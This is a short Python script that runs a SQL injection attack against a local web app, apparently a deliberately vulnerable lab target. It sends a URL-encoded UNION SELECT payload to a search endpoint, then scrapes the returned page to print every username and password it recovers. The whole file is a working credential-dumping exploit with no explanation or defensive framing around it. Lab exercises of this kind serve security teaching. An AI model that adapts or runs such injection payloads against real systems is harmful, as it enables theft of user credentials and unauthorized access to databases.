import requests
from bs4 import BeautifulSoup

print("\n============== DUMPING USERS TABLE ===============\n")

index = 0
url = 'http://127.0.0.1:5000/search_vulnerable?q=%27%20union%20select%20null,%20username,%20password,%20null,%20null%20from%20users%20%23'
response = requests.get(url=url)

# Create a BeautifulSoup object to parse the HTML
soup = BeautifulSoup(response.text, 'html.parser')

# Find all <h2> tags that have the class "card-title"
user_tags = soup.find_all('h2', class_='card-title')
password_tags = soup.find_all('p', class_='card-text')

# Loop through the found tags and print their text content
for j in range(len(user_tags)):
    if index > 6:
        # .text extracts the clean text from within the tag
        print(f"{user_tags[j].text}: {password_tags[j].text}")
    index += 1

print(f"\nAttack complete retrieved {index - 7} users!")
